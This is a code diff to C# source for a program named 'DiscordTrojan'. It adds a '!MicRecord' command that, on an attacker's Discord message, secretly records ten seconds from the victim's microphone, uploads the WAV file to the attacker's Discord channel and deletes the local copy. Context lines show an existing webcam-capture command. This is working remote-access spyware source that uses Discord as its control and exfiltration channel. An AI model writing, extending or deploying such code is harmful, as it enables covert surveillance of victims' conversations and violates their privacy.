@@ -27,9 +27,7 @@ using System.Linq;
 using System.Text;
 using System.Collections.Generic;
 
-
-
-
+using NAudio.Wave;
 
 
 namespace DiscordTrojan
@@ -62,6 +60,7 @@ namespace DiscordTrojan
 
         private DiscordSocketClient _client;
 
+        private bool _isListening = false;
 
 
 
@@ -188,7 +187,62 @@ namespace DiscordTrojan
                     {
                         message.Channel.SendMessageAsync("No camera found");
                     }
-                }             
+                }
+                if (message.Content == "!MicRecord")
+                {
+                    const int audioDurationSeconds = 10;
+                    const string audioFileName = "audio.wav";
+
+                    // Set up the WaveInEvent for audio recording
+                    using (var waveInEvent = new WaveInEvent())
+                    {
+                        // Set the desired format for recording (you can adjust these settings as needed)
+                        waveInEvent.WaveFormat = new WaveFormat(44100, 1);
+
+                        var buffer = new byte[waveInEvent.WaveFormat.AverageBytesPerSecond * audioDurationSeconds];
+                        var bytesRead = 0;
+
+                        // Record audio for the specified duration
+                        waveInEvent.DataAvailable += (s, a) =>
+                        {
+                            Buffer.BlockCopy(a.Buffer, 0, buffer, bytesRead, a.BytesRecorded);
+                            bytesRead += a.BytesRecorded;
+                            if (bytesRead >= buffer.Length)
+                            {
+                                waveInEvent.StopRecording();
+                            }
+                        };
+
+                        var recordingTaskCompletionSource = new TaskCompletionSource<bool>();
+
+                        waveInEvent.RecordingStopped += (s, a) =>
+                        {
+                            // Save the recorded audio as a WAV file
+                            using (var fileWriter = new WaveFileWriter(audioFileName, waveInEvent.WaveFormat))
+                            {
+                                fileWriter.Write(buffer, 0, bytesRead);
+                            }
+
+                            // Sending the audio file to Discord on a separate thread
+                            new Thread(() =>
+                            {
+                                message.Channel.SendFileAsync(audioFileName).ContinueWith(task =>
+                                {
+                                    // Delete the temporary audio file after sending
+                                    File.Delete(audioFileName);
+                                    recordingTaskCompletionSource.SetResult(true);
+                                });
+                            }).Start();
+                        };
+
+                        // Start recording
+                        waveInEvent.StartRecording();
+
+                        // Wait for the specified duration before stopping recording
+                        Thread.Sleep(audioDurationSeconds * 1000);
+                    }
+
+                }
             }
             return Task.CompletedTask;
         }
